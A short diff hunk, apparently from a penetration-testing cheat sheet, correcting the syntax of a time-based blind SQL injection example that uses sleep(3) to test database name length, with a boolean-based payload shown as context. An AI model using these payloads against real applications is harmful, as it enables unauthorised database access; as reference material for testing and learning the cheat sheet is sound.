@@ -23,7 +23,7 @@ Examples:
 1' AND (SELECT LENGTH(database()))=1-- -
 
 #Time Based  
-1' AND IF (SELECT LENGTH(database()))=1, sleep(3),'false')-- -
+1' AND IF ((SELECT LENGTH(database()))=1, sleep(3),'false') -- -
 ```
 {% endtab %}
 
